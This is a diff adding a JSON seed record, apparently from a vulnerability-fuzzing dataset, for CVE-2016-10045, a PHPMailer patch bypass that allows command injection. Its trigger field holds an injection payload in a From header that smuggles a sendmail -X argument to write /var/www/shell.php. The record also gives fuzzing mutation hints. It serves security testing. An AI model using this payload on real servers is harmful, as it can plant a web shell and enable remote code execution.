@@ -1,0 +1,53 @@
+{
+  "avd_id": "CVE-2016-10045",
+  "scope": "seedgen",
+  "confidence": "high",
+  "title_avd": "PHPMailer escapeshellarg 绕过远程代码执行（patch bypass）",
+  "description_raw": "PHPMailer 5.2.20 之前 escapeshellarg() 与 mail() 内部 escapeshellcmd() 冲突，可注入额外引号突破转义，绕过 CVE-2016-10033 补丁实现 RCE。",
+  "risk_level_avd": "严重",
+  "cwe_avd": "CWE-77 (命令注入)",
+  "trigger": {
+    "method": {
+      "value": [
+        "MAIL FROM"
+      ],
+      "confidence": "confirmed"
+    },
+    "field": {
+      "value": "From 地址（转义绕过）",
+      "confidence": "confirmed"
+    },
+    "condition": {
+      "value": "利用 escapeshellarg/escapeshellcmd 冲突注入额外引号",
+      "confidence": "confirmed"
+    }
+  },
+  "trigger_requests": {
+    "value": [
+      "From: \"a\\' -X/var/www/shell.php \\'@b\" <a@b>"
+    ],
+    "confidence": "confirmed"
+  },
+  "mutation_hints": {
+    "value": [
+      "单引号/双引号转义绕过 fuzz",
+      "escapeshellarg 冲突字符集"
+    ],
+    "confidence": "confirmed"
+  },
+  "provenance": {
+    "description_raw": "confirmed",
+    "title_avd": "confirmed",
+    "risk_level_avd": "confirmed",
+    "cwe_avd": "confirmed",
+    "trigger_method": "confirmed",
+    "trigger_field": "confirmed",
+    "trigger_condition": "confirmed",
+    "trigger_requests": "confirmed",
+    "trigger_requests_note": "CVE-2016-10033 补丁绕过",
+    "mutation_hints": "confirmed"
+  },
+  "unmatched_avd": false,
+  "avd_id_equivalent": null,
+  "case_id": "SMTP-027"
+}
